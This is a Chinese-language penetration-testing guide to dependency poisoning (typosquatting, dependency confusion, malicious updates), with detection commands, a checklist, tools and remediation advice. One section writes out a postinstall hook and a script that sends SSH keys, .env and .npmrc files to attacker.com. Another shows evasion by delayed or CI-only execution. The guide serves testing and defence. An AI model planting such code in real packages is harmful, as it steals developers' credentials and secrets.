# 依赖投毒攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的依赖投毒攻击检测与利用流程。

## 1.2 适用范围

本文档适用于使用包管理器（npm、pip、Maven 等）的软件项目。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

依赖投毒是指攻击者通过向公共包仓库发布恶意包，或篡改现有包，使开发者在不知情的情况下安装包含恶意代码的依赖。

**本质问题**：
- 缺少包完整性验证
- 过度信任公共仓库
- 缺少依赖审查流程

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-494 | 下载代码 without 完整性检查 |
| CWE-829 | 从不可信控制域包含功能 |

## 2.2 攻击常见于哪些业务场景

| 攻击类型 | 描述 | 影响 |
|---------|------|------|
| Typosquatting | 注册与流行包名相似的包名 | 开发者误安装 |
| 依赖混淆 | 发布与内部包同名的公共包 | 构建系统误拉取 |
| 恶意更新 | 攻陷合法包发布恶意版本 | 所有用户受影响 |
| 账户劫持 | 劫持维护者账户发布恶意代码 | 供应链污染 |

## 2.3 漏洞发现方法

### 2.3.1 依赖审计

```bash
# npm 项目审计
npm audit

# 检查异常依赖
npm list --depth=0

# 检查 package-lock.json
# 查找不寻常的包或版本
```

### 2.3.2 恶意行为检测

```bash
# 检查 postinstall 脚本
cat package.json | grep -A 5 "scripts"

# 常见恶意行为：
# - 安装时执行脚本
# - 收集环境变量
# - 外连到可疑域名
```

### 2.3.3 依赖树分析

```bash
# 查看完整依赖树
npm list --all
yarn why <package-name>

# 检查深层依赖
# 恶意代码可能隐藏在传递依赖中
```

## 2.4 漏洞利用方法

### 2.4.1 Typosquatting 攻击

```bash
# 攻击者发布相似名称的包
# 例如：requests → requestss
#       lodash → l0dash

# 开发者误输入安装：
npm install requestss  # 安装了恶意包
```

### 2.4.2 依赖混淆攻击

```bash
# 攻击者发现公司内部包名
# 在公共仓库发布同名包（更高版本号）

# 构建系统配置错误时：
# 1. 优先从公共源拉取
# 2. 安装恶意包
# 3. 恶意代码执行
```

### 2.4.3 恶意脚本执行

```javascript
// package.json 中的恶意脚本
{
  "name": "malicious-package",
  "scripts": {
    "postinstall": "node .hooks/exfil.js"
  }
}

// exfil.js 窃取敏感数据
const fs = require('fs');
const https = require('https');

// 窃取 SSH 密钥、.env 文件等
const sensitiveFiles = [
    '~/.ssh/id_rsa',
    '.env',
    '.npmrc'
];

sensitiveFiles.forEach(file => {
    try {
        const content = fs.readFileSync(file, 'utf8');
        https.get(`https://attacker.com/steal?file=${file}&data=${encodeURIComponent(content)}`);
    } catch(e) {}
});
```

## 2.5 漏洞利用绕过方法

### 2.5.1 签名验证绕过

```bash
# 如果项目未启用包签名验证
# 恶意包可以直接发布

# 绕过方法：
# 1. 使用有效发布者账户
# 2. 包通过基本验证
# 3. 无明显恶意特征
```

### 2.5.2 检测规避

```javascript
// 延迟执行恶意代码
setTimeout(() => {
    // 在首次安装后执行
    exfiltrateData();
}, 3600000);  // 1 小时后

// 条件触发
if (process.env.CI === 'true') {
    // 仅在 CI/CD 环境执行
    stealCredentials();
}
```

---

# 第三部分：附录

## 3.1 依赖投毒检测检查清单

```
□ 审计所有直接依赖
□ 审计传递依赖
□ 检查 postinstall 脚本
□ 验证包发布者
□ 检查包下载量/评价
□ 使用自动化工具扫描
□ 实施锁定文件
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| npm audit | npm 安全审计 | 内置 |
| Snyk | 依赖漏洞扫描 | https://snyk.io/ |
| Socket | 依赖行为分析 | https://socket.dev/ |
| OWASP Dependency-Track | SBOM 管理 | https://dependencytrack.org/ |

## 3.3 修复建议

1. **锁定依赖版本** - 使用 package-lock.json 等
2. **启用签名验证** - 验证包的完整性
3. **使用私有仓库** - 内部包使用私有源
4. **定期审计** - 定期审查依赖安全性

---

**参考资源**：
- [OWASP Software Supply Chain Security](https://owasp.org/www-project-software-supply-chain-security/)
- [SLSA Framework](https://slsa.dev/)
